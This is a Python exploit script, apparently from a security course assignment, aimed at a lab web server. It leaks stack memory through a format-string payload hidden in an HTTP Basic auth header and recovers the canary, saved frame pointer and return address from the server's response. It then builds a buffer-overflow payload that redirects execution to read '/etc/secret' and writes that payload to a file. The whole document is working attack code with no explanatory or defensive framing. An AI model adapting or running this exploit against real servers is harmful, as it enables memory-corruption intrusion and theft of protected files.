import base64
import requests
import binascii
import subprocess
import struct


def write_binary_data_from_hex(filename, hex_data):
    binary_data = binascii.unhexlify(hex_data)
    with open(filename, "wb") as file:
        file.write(binary_data)


response=[]
i=0
start="%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x :1"

b = base64.b64encode(bytes(start, 'utf-8')) # bytes
base64_str = b.decode('utf-8') # convert bytes to string
url = 'http://project-2.csec.chatzi.org:8000/'
headers = {
    'Content-Type': 'application/json',
    'Authorization': 'Basic '+base64_str
}
data = {
    'test': 'example'
}
try:
    response = requests.post(url, headers=headers, data=data)
except requests.exceptions.Timeout:
    print("Timeout occurred")
    start="%08x "+start

x=list(response.headers['WWW-Authenticate'].split(" "))

return_adress=x[-2]
canary=x[-6]
ebp=x[-3]

buf_adr=[]

targ=hex(int.from_bytes("/etc/secret".encode(), byteorder='big'))[2:]+"00"

payload=targ

canary=str(struct.pack('<I', int(canary, 16)).hex())

postdata=str(struct.pack('<I', int(ebp, 16) - 120).hex())

sendaddr=str(struct.pack('<I', int(return_adress,16)+1581).hex())

for i in range((52-len(targ)//2)):
    payload+="90"

payload+=postdata+"90909090"+canary.replace('00', '3D')+"90909090"+"90909090"+"90909090"+sendaddr+"90909090"+postdata


payload=payload.replace('00', '3D')

write_binary_data_from_hex("payload.bin", payload)